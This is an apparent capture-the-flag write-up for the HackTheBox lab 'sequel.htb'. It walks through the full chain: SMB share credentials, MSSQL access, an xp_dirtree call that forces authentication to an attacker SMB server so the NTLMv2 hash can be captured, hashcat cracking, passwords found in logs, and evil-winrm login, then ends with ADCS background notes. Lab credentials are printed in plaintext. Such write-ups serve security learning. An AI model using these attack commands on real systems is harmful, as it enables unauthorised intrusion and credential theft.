After connecting to the remote public share that it is readable I found a file `SQL Server Procedures.pdf`. I then downloaded the file to be analyzed, from here i found the user: `brandon`

![[Pasted image 20240423191535.png]]

In this PDF, as can be seen above we find credentials for the SQL server.
`PublicUser`:`GuestUserCantWrite1`

Next, I used `impacket-mssqlclient` to inspect the database.
```bash
$ impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb

## Foothold

One thing we can do here is run `xp_dirtree` to list the contents of a controlled SMB share, so that we can get the NTLMv2 hash and try to crack it afterwards. Letâ€™s set up the SMB server:

Starting an **smbserver** using `impacket`:
```bash
impacket-server smbFolder $(pwd) -smb2support
```

Now from the SQL server:
```bash
SQL> EXEC xp_dirtree '\\10.10.14.40\smbFolder', 1, 1
```

With the impacket SMB server running, we then receive the hash for the `sql_svc` user. After running hashcat on this has using hashcat:

```bash
hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt

```

Password Found: `REGGIE1234ronnie`

User found on the system:
```powershell

Ryan.Cooper
```

After looking at the base of the system we then find a `SQLServer` folder with a Logs directory. This contains the login information for `Ryan.Cooper` in the last couple lines. It looks like he entered in his information wrong the first time, then incidentally put his password in as his username... Thus showing us the password in cleartext in the error logs.

```

```
`Ryan.Cooper`:`NuclearMosquito3`

After logging in as `Ryan.Cooper` via `evil-winrm` and checking privileges with `whoami /all`/`whoami /priv` I didn't find anything useful. So from here I decided to run `winpeas.exe` on the host to search for any possible privilege escalation vectors.

At this point, it should be noted that on Windows domains, it's import to look for Active Directory Certificate Services(ADCS). A quick way to check for this is using `crackmapexec`.
```bash
crackmapexec ldap $IP -u ryan.cooper -p NuclearMosquito3 -M adcs

#### AD Certificate Attack
##### Components of a Certificate
- Subject, denotes owner
- Public Key, paired with a private key to link cert to its owner
- Validity period
- SerialNumber
- Issuer CertAuthority
- SubjectAltenativeName, allows for additional names for suubject, enhancing identification
- Basic Constrains, whether the cert if for a CA or an end entity and define usage restrictions
- Extended Key Usages (EKUs) delineate the certificate's specific purposes, like code signing or email encryption through Object Identifier
- Signature Algorithm
- The signature itself
##### Special Considerations

- **Subject Alternative Names (SANs)** expand a certificate's applicability to multiple identities, crucial for servers with multiple domains. Secure issuance processes are vital to avoid impersonation risks by attackers manipulating the SAN specification.
##### Certificate Authorities (CAs) in Active Directory (AD)

AD CS acknowledges CA certificates in an AD forest through designated containers, each serving unique roles:

- **Certification Authorities** container holds trusted root CA certificates.
- **Enrolment Services** container details Enterprise CAs and their certificate templates.
- **NTAuthCertificates** object includes CA certificates authorized for AD authentication.
- **AIA (Authority Information Access)** container facilitates certificate chain validation with intermediate and cross CA certificates.


##### Certificate Acquisition: Client Certificate Request Flow
- Begins with clients finding an enterprise CA
- A CSR is created, containing a public key among other details, after generatinga  public-privaet key pair.
- The CA assesses the CSR against available certificate templates, issuing the certificate based on the template's permissions.
- Upon approval, the CA signs the certificate with its private key and returns it to the client.

##### Certificate Templates

Defined within AD, these templates outline the settings and permissions for issuing certificates, including permitted EKUs and enrollment or modification rights, critical for managing access to certificate services.

Boring... I know...

I will be using [Certipy](https://github.com/ly4k/Certipy) for privilege escalation as the Administrator.
